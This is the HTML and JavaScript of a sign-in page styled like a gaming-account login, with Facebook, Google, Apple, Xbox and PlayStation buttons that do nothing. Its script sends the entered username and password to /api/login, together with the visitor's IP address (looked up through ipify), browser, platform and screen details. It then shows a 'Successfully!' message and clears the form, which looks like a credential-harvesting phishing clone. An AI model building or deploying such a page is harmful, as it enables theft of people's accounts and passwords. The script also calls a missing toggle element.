<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sign In</title>
    <link rel="stylesheet" href="/styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px;
            border-radius: 4px;
            color: white;
            display: none;
        }
        .toast.success {
            background-color: #4CAF50;
        }
        .toast.error {
            background-color: #f44336;
        }
    </style>
</head>
<body>
    <div class="loginBlock">
        <h1>Sign in</h1>
        <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="off">
            <div class="input-group">
                <input type="text" id="username" name="username" required>
                <label>USERNAME</label>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" required>
                <label>PASSWORD</label>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="staySignedIn">
                <label for="staySignedIn">Stay signed in</label>
            </div>
            
            <button type="submit" id="submitButton" class="sign-in-btn">
                <span class="button-text">→</span>
            </button>

            <div class="social-login">
                <button type="button" class="social-btn facebook">
                    <i class="fab fa-facebook-f"></i>
                </button>
                <button type="button" class="social-btn google">
                    <i class="fab fa-google"></i>
                </button>
                <button type="button" class="social-btn apple">
                    <i class="fab fa-apple"></i>
                </button>
                <button type="button" class="social-btn xbox">
                    <i class="fab fa-xbox"></i>
                </button>
                <button type="button" class="social-btn playstation">
                    <i class="fab fa-playstation"></i>
                </button>
            </div>

            <div class="bottom-links">
                <a href="#">CAN'T SIGN IN?</a>
                <a href="#">CREATE ACCOUNT</a>
            </div>
        </form>
    </div>
    <div id="toast" class="toast"></div>
    <script>
    const getBrowserInfo = () => {
        return {
            browser: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screenResolution: `${window.screen.width}x${window.screen.height}`
        };
    }

    async function handleSubmit(event) {
        event.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const timestamp = new Date().toISOString();
        const button = document.getElementById('submitButton');
        const browserInfo = getBrowserInfo();
        
        try {
            button.disabled = true;
            button.innerHTML = 'Sending...';

            // Get IP address first
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipAddress = ipData.ip;

            // Call your API endpoint
          const response = await fetch('/api/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    timestamp: timestamp,
                    ipAddress: ipAddress,
                    browserInfo: browserInfo
                })
            });
            
            if (response.ok) {
                showToast('Successfully!', 'success');
                document.getElementById('loginForm').reset();
            } else {
                throw new Error('Failed');
            }
        } catch (error) {
            console.error('Error:', error);
            showToast('Error: ' + error.message, 'error');
        } finally {
            button.disabled = false;
            button.innerHTML = '→';
        }
        return false;
    }

    function showToast(message, type) {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.className = `toast ${type}`;
        toast.style.display = 'block';
        
        // Force a reflow to trigger animation
        toast.offsetHeight;
        
        setTimeout(() => {
            toast.style.opacity = '0';
            setTimeout(() => {
                toast.style.display = 'none';
                toast.style.opacity = '1';
            }, 300);
        }, 3000);
    }

    document.getElementById('togglePassword').addEventListener('click', function() {
        const password = document.getElementById('password');
        const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
        password.setAttribute('type', type);
        this.className = `fas fa-${type === 'password' ? 'eye' : 'eye-slash'}`;
    });
    </script>
</body>
</html>
